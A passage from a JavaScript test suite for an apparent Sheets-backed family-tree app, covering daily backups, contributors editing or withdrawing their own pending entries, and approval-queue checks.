  assert.strictEqual(folders[0].parent, 'rootsFolder', 'beside the Sheet');
  const copies = () => Object.values(t.drive.files).filter(f => f.parent === folders[0].id && !f.trashed);
  assert.strictEqual(copies().length, 1);
  assert.deepStrictEqual(copies()[0].sheets.map(s => s.name).sort(), Object.keys(t.sheets).sort(), 'every tab, by its own name');
  assert.ok(copies()[0].sheets.find(s => s.name === 'People').data.length > 1, 'with the data');
  t.run('notifyDigest');
  assert.strictEqual(copies().length, 1, 'not again within the day');
  for (let i = 0; i < 35; i++) { t.props.LAST_BACKUP = '0'; t.run('notifyDigest'); }
  assert.strictEqual(copies().length, 30, 'oldest trashed past 30');
  assert.deepStrictEqual(t.env._errors, []);
});

test('own unconfirmed entries: edit in place, take back with links, strays go too', () => {
  const { t, key, ids } = setup();
  // Linda adds a parent for Carol (with a wrong nickname) and a half-sibling held by an Unknown parent.
  const r = t.post({ action: 'submit', token: TOK_LINDA, items: [
    { kind: 'person', ref: 'new:a', data: { first_name: 'Amanda', birth_surname: 'Ross', nicknames: 'Mom', living: 'living' } },
    { kind: 'relationship', type: 'parent_child', a: 'new:a', b: ids['new:kid'] },
    { kind: 'person', ref: 'new:h', data: { first_name: 'Hal', living: 'living' } },
    { kind: 'person', ref: 'new:u', data: { is_placeholder: true } },
    { kind: 'relationship', type: 'parent_child', a: ids['new:me'], b: 'new:h' },
    { kind: 'relationship', type: 'parent_child', a: 'new:u', b: 'new:h' }
  ] });
  assert.strictEqual(r.ok, true, JSON.stringify(r));
  const A = r.ids['new:a'], H = r.ids['new:h'], U = r.ids['new:u'];
  // Fix the nickname: a full rewrite of the form's fields.
  const e = t.post({ action: 'own_edit', token: TOK_LINDA, id: A, data: { first_name: 'Amanda', middle_name: 'Renee', birth_surname: 'Ross', living: 'living' }, source: 'I know her' });
  assert.strictEqual(e.ok, true, JSON.stringify(e));
  const row = t.sheets.People._data.find(x => x[0] === A);
  const P = t.sheets.People._data[0];
  assert.strictEqual(row[P.indexOf('nicknames')], '', 'cleared field clears');
  assert.strictEqual(row[P.indexOf('middle_name')], 'Renee');
  assert.strictEqual(row[P.indexOf('status')], 'pending', 'still waits for Jonny');
  assert.strictEqual(row[P.indexOf('source')], 'I know her');
  // A nameless edit is refused; someone else's entry is refused; an approved one is refused.
  assert.strictEqual(t.post({ action: 'own_edit', token: TOK_LINDA, id: A, data: { living: 'living' } }).ok, false);
  assert.ok(/isn't one of yours|Nothing from this device/.test(t.post({ action: 'own_edit', token: TOK_STRANGER, id: A, data: { first_name: 'X' } }).error || ''));
  assert.ok(/isn't one of yours/.test(t.post({ action: 'withdraw', token: TOK_LINDA, ids: [ids['new:me']] }).error || ''));
  // Take back Hal: his two links go, and the Unknown parent that only held him goes too.
  const w = t.post({ action: 'withdraw', token: TOK_LINDA, ids: [H] });
  assert.strictEqual(w.ok, true, JSON.stringify(w));
  assert.ok(w.withdrawn.includes(H) && w.withdrawn.includes(U) && w.withdrawn.length === 4, JSON.stringify(w.withdrawn));
  const own = t.get({ action: 'tree', token: TOK_LINDA }).own;
  assert.deepStrictEqual(own.people.map(p => p.id), [A], 'only Amanda left in her view');
  assert.strictEqual(own.relationships.length, 1);
  const q = t.post({ action: 'admin_queue', key });
  assert.ok(!JSON.stringify(q).includes(H), 'gone from the approval queue');
  assert.ok(/already taken back/.test(t.post({ action: 'withdraw', token: TOK_LINDA, ids: [H] }).error || ''));
  // Taking back Amanda's only link takes Amanda too: nothing would connect her.
  const w2 = t.post({ action: 'withdraw', token: TOK_LINDA, ids: [own.relationships[0].id] });
  assert.ok(w2.withdrawn.includes(A), JSON.stringify(w2));
  assert.strictEqual(t.get({ action: 'tree', token: TOK_LINDA }).own.people.length, 0);
  // Reviewed entries can't be taken back.
  const r2 = t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'person', ref: 'new:z', data: { first_name: 'Zed' } }, { kind: 'relationship', type: 'parent_child', a: ids['new:me'], b: 'new:z' }] });
  t.post({ action: 'admin_approve', key, items: [{ kind: 'person', id: r2.ids['new:z'] }] });
  assert.ok(/already reviewed/.test(t.post({ action: 'withdraw', token: TOK_LINDA, ids: [r2.ids['new:z']] }).error || ''));
  assert.deepStrictEqual(t.env._errors, []);
});

test('re-editing someone replaces your own earlier unconfirmed changes in one call', () => {
  const { t, ids } = setup();
  const s1 = t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'suggestion', target_id: ids['new:gpa'], field: 'first_name', value: 'Joseph' }] });
  assert.strictEqual(s1.ok, true);
  const mine = () => t.get({ action: 'tree', token: TOK_LINDA }).own.suggestions;
  const old = mine()[0].id;
  const s2 = t.post({ action: 'submit', token: TOK_LINDA, withdraw: [old], items: [{ kind: 'suggestion', target_id: ids['new:gpa'], field: 'first_name', value: 'Josef' }] });
  assert.strictEqual(s2.ok, true, JSON.stringify(s2));
  assert.deepStrictEqual(mine().map(s => s.value), ['Josef']);
  // A withdraw list with someone else's entry stops the whole call before anything is written.
  const bad = t.post({ action: 'submit', token: TOK_STRANGER, withdraw: [mine()[0].id], items: [{ kind: 'suggestion', target_id: ids['new:gpa'], field: 'notes', value: 'x' }] });
  assert.strictEqual(bad.ok, false);
  assert.strictEqual(t.sheets.Suggestions._data.filter(r => r.includes('x') && r.includes('notes')).length, 0);
  // Take back alone.
  assert.strictEqual(t.post({ action: 'withdraw', token: TOK_LINDA, ids: [mine()[0].id] }).ok, true);
  assert.strictEqual(mine().length, 0);
});

test('no unexpected server errors were logged', () => {
  // each test builds a fresh env; this one just checks a full happy path is clean
  const { t } = setup();
  t.get({ token: TOK_JONNY });
  assert.deepStrictEqual(t.env._errors, []);
});

console.log(`\n${passed} passed, ${failures.length} failed`);
if (failures.length) process.exit(1);
